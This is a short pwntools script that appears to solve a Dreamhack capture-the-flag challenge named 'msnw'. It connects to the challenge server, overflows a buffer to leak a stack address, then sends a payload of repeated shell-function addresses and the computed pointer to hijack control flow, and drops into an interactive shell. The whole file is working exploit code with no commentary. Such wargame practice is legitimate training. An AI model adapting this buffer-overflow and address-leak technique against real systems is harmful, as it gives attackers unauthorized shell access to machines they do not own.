from pwn import *

#p = process('./msnw')
p = remote('host3.dreamhack.games', 19612)

shell = 0x40135b
payload = b"A"*0x130

p.sendafter(b":", payload)
p.recvuntil(payload)
leak = u64(p.recv(6) + b'\x00'*2)
exploit = leak - 0x300

payload = p64(shell)*0x26 + p64(exploit)
p.sendafter(b":", payload)
p.interactive()